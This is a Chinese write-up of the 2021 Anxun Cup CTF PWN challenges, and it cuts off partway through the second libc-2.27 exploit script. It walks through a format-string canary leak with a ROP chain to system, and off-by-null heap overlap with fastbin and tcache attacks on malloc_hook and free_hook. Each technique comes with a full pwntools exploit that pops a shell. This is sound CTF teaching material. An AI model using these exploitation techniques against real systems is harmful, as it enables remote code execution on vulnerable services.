# 2021安洵杯PWN WP详解
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
做了2021安洵杯线上赛题目，总体来说题目有简单有难的，难易程度合适，这次就做了pwn，把四道pwn题思路总结一下，重点是没几个人做出来的最后一道pwnsky，赛后做了复现。
## PWN -> stack (stack overflow ,fmt)
###  题目分析
保护全开，存在栈溢出，格式化字符串漏洞
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char buf[24]; // [rsp+10h] [rbp-20h] BYREF
      unsigned __int64 v5; // [rsp+28h] [rbp-8h]
      v5 = __readfsqword(0x28u);
      init(argc, argv, envp);
      read(0, buf, 0x100uLL);                       // stackoverflow
      printf(buf);                                  // fmt
      puts("--+--");
      read(0, buf, 0x100uLL);
      printf(buf);
      return 0;
    }
存在system、binsh：
    int useless()
    {
      char v1; // [rsp+Fh] [rbp-1h]
      return system((const char *)v1);
    }
###  利用
  1. 格式化字符串泄露canary、processbaseaddr
  2. 栈溢出劫持控制流
###  exp
    # -*- coding: UTF-8 -*-    from pwn import *
    context.log_level = 'debug'
    context.terminal = ["/usr/bin/tmux","sp","-h"]
    io = remote('47.108.195.119', 20113)
    # libc = ELF('./libc-2.31.so')
    #io = process('./ezstack')
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
    l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
    rl = lambda    a=False        : io.recvline(a)
    ru = lambda a,b=True    : io.recvuntil(a,b)
    rn = lambda x            : io.recvn(x)
    sn = lambda x            : io.send(x)
    sl = lambda x            : io.sendline(x)
    sa = lambda a,b            : io.sendafter(a,b)
    sla = lambda a,b        : io.sendlineafter(a,b)
    irt = lambda            : io.interactive()
    dbg = lambda text=None  : gdb.attach(io, text)
    lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
    uu32 = lambda data        : u32(data.ljust(4, '\x00'))
    uu64 = lambda data        : u64(data.ljust(8, '\x00'))
    ur64 = lambda data        : u64(data.rjust(8, '\x00'))
    sla('请输入你的队伍名称:','SN-天虞')
    sla('请输入你的id或名字:','一梦不醒')
    useless = 0xA8c
    pop_rdi = 0x0000000000000b03
    binsh = 0x00B24
    sl('%17$p@%11$p')
    process = int(ru('@')[-14:],16) - 0x9dc
    print hex(process)
    canary = int(rn(18),16)
    print hex(canary)
    pay = 'a'* 0x18 + p64(canary) + p64(0xdeadbeef)+ p64(process + pop_rdi) + p64(process + binsh) + p64(process + useless)
    sla('--+--\n',pay)
    irt()
## PWN -> noleak (offbynull,tcache bypass)
###  题目分析
保护全开，ida查看理清程序逻辑，特别是分析结构体，add和delete功能和chunk的idx索引怎么变化，然后就是edit是否存在漏洞，功能分析:
  1. 输入加密str进入程序，简单的亦或为`N0_py_1n_tHe_ct7`
  2. 添加chunk，输入idx和size，在bss段有chunks结构体，最多10个chunk,没有判断chunk是否为null，可以重复添加
  3. 删除chunk，不存在uaf
  4. 编辑chunk，存在offbynull
  5. 查看chunk，输出内容
add函数：
    unsigned __int64 add()
    {
      unsigned int v0; // ebx
      unsigned int v2; // [rsp+0h] [rbp-20h] BYREF
      _DWORD size[7]; // [rsp+4h] [rbp-1Ch] BYREF
      *(_QWORD *)&size[1] = __readfsqword(0x28u);
      v2 = 0;
      size[0] = 0;
      puts("Index?");
      __isoc99_scanf("%d", &v2);
      if ( v2 > 9 )
      {
        puts("wrong and get out!");
        exit(0);
      }
      puts("Size?");
      __isoc99_scanf("%d", size);
      v0 = v2;
      (&chunks)[2 * v0] = malloc(size[0]);
      if ( !(&chunks)[2 * v2] )
      {
        puts("error!");
        exit(0);
      }
      LODWORD((&chunks)[2 * v2 + 1]) = size[0];
      return __readfsqword(0x28u) ^ *(_QWORD *)&size[1];
    }
chunk结构体：
    struct{
        char* ptr;
        int size;
    }
编辑函数：
    unsigned __int64 edit()
    {
      int v0; // eax
      unsigned int v2; // [rsp+Ch] [rbp-14h] BYREF
      _QWORD *v3; // [rsp+10h] [rbp-10h]
      unsigned __int64 v4; // [rsp+18h] [rbp-8h]
      v4 = __readfsqword(0x28u);
      puts("Index?");
      __isoc99_scanf("%d", &v2);
      if ( v2 > 9 )
        exit(0);
      if ( !(&chunks)[2 * v2] )
        exit(0);
      v3 = (&chunks)[2 * v2];
      puts("content:");
      v0 = read(0, (&chunks)[2 * v2], LODWORD((&chunks)[2 * v2 + 1]));
      *((_BYTE *)v3 + v0) = 0; //offbynull
      return __readfsqword(0x28u) ^ v4;
    }
chunk的idx索引和数组索引一致。  
当时做题只看了编译程序的ubuntu版本是16.04，就以为是libc-2.23，结果本地都打通了远程不行，后来才发现题目提供的libc是2.27的，eimo了，一下提供两个环境下的利用方式：
**libc-2.23:**
  1. unsorted bin leak libcaddr
  2. make chunk merge up to unsorted bin
  3. fastbin attack to malloc mallochook
  4. onegadget to getshell
**libc-2.27（tcache）:**
利用方式1：
填满tcache bypass tcache
  1. fill up the tcache and make chunk merge up by offbynull
  2. unsortedbin leak libcaddr
  3. add chunk to make chunk overlap
  4. tcache attack to malloc freehook
  5. malloc chunk to tigger system
利用方式2：
tcache只有64个单链表结构，每个链表最多7个chunk，64位机器上以16字节递增，从24到1032字节，所以tcache只能是no-large
chunk，我们可以申请large chunk绕过tcache
  1. malloc large chunk and make chunk merge up by offbynull
  2. malloc chunk to leak libc addr
  3. fastbin attack to malloc freehook
  4. modify freehook to system
  5. free chunk to tigger system
###  exp
exp1 libc-2.23:
    # -*- coding: UTF-8 -*-    from pwn import *
    context.log_level = 'debug'
    context.terminal = ["/usr/bin/tmux","sp","-h"]
    #io = remote('47.108.195.119', 20182)
    # libc = ELF('./libc-2.31.so')
    io = process('noleak1')
    libc = ELF('/glibc/2.23/64/lib/libc.so.6')
    l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
    l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
    rl = lambda    a=False        : io.recvline(a)
    ru = lambda a,b=True    : io.recvuntil(a,b)
    rn = lambda x            : io.recvn(x)
    sn = lambda x            : io.send(x)
    sl = lambda x            : io.sendline(x)
    sa = lambda a,b            : io.sendafter(a,b)
    sla = lambda a,b        : io.sendlineafter(a,b)
    irt = lambda            : io.interactive()
    dbg = lambda text=None  : gdb.attach(io, text)
    lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
    uu32 = lambda data        : u32(data.ljust(4, '\x00'))
    uu64 = lambda data        : u64(data.ljust(8, '\x00'))
    ur64 = lambda data        : u64(data.rjust(8, '\x00'))
    def add(idx,size):
        sl('1')
        sla('Index?\n',str(idx))
        sla('Size?\n',str(size))
    def show(idx):
        sl('2')
        sla('Index?\n',str(idx))
    def edit(idx,content):
        sl('3')
        sla('Index?\n',str(idx))
        sa('content:\n',content)
    def delete(idx):
        sl('4')
        sla('Index?\n',str(idx))
    enc = [0x4E, 0x79, 0x5F, 0x5F, 0x30, 0x5F, 0x74, 0x63, 0x5F, 0x31, 
      0x48, 0x74, 0x70, 0x6E, 0x65, 0x37]
    s = ''
    for i in range(4):
        for j in range(4):
            s += chr(enc[4*j+i])
            print s
    #sla('请输入你的队伍名称:','SN-天虞')
    #sla('请输入你的id或名字:','一梦不醒')
    sl('N0_py_1n_tHe_ct7')
    add(0,0xf0)
    add(1,0x50)
    delete(0)
    add(0,0xf0)
    show(0)
    leak = uu64(rl())
    lg('leak')
    libcbase = leak - 0x3c3b78
    lg('libcbase')
    mallochook = libcbase + libc.symbols['__malloc_hook']
    lg('mallochook')
    system = libcbase + libc.symbols['system']
    lg('system')
    add(2,0xf0)
    add(3,0x68)
    add(4,0x68)
    add(5,0x178)
    add(6,0x10)
    delete(2)
    delete(3)  # free to fastbin
    edit(4,'a'*0x60+p64(0x100+0x70*2)) # offbynull
    edit(5,'a'*0xf0+p64(0)+p64(0x81))  # fake chunk lastremainder
    delete(5)  # chunk Merge up to unsorted bin
    add(5,0xf0+0x70)  # malloc unsorted bin
    edit(5,'a'*0xf0+p64(0)+p64(0x70)+p64(mallochook-0x23)) # modify chunk 3 fd to mallochook
    # fastbin atttack
    add(2,0x68) 
    add(3,0x68)
    one = [0x45206,0x4525a,0xef9f4,0xf0897]
    edit(3,'a'*0x13+p64(libcbase + one[2]))
    #dbg()
    add(2,0xf0)
    irt()
exp2 libc-2.27：
    # -*- coding: UTF-8 -*-    from pwn import *
    #context.log_level = 'debug'
    context.terminal = ["/usr/bin/tmux","sp","-h"]
    io = remote('47.108.195.119', 20182)
    # libc = ELF('./libc-2.31.so')
    #io = process('noleak2')
    libc = ELF('./libc.so.6')
    l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
    l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
    rl = lambda    a=False        : io.recvline(a)
    ru = lambda a,b=True    : io.recvuntil(a,b)
    rn = lambda x            : io.recvn(x)
    sn = lambda x            : io.send(x)
    sl = lambda x            : io.sendline(x)
    sa = lambda a,b            : io.sendafter(a,b)
    sla = lambda a,b        : io.sendlineafter(a,b)
    irt = lambda            : io.interactive()
    dbg = lambda text=None  : gdb.attach(io, text)
    lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
    uu32 = lambda data        : u32(data.ljust(4, '\x00'))
    uu64 = lambda data        : u64(data.ljust(8, '\x00'))
    ur64 = lambda data        : u64(data.rjust(8, '\x00'))
    def add(idx,size):
        sl('1')
        sla('Index?\n',str(idx))
        sla('Size?\n',str(size))
    def show(idx):
        sl('2')
        sla('Index?\n',str(idx))
    def edit(idx,content):
        sl('3')
        sla('Index?\n',str(idx))